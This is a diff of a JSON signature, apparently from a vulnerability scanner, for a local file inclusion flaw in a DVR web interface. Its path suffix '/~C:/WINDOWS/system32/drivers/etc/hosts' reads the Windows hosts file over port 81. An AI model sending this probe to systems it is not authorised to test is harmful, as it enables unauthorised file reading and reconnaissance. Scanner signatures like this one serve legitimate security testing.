@@ -1,11 +1,11 @@
 {
-    "name": "iDVR_Mobile_Video_dvr_LFI",
+    "name": "g_LFI",
     "method": "GET",
     "port": [
         81
     ],
     "suffix": "/~C:/WINDOWS/system32/drivers/etc/hosts",
     "hits": [
-        "Microsoft"
+        "This is a sample HOSTS file used by Microsoft TCP/IP for Windows"
     ]
 }
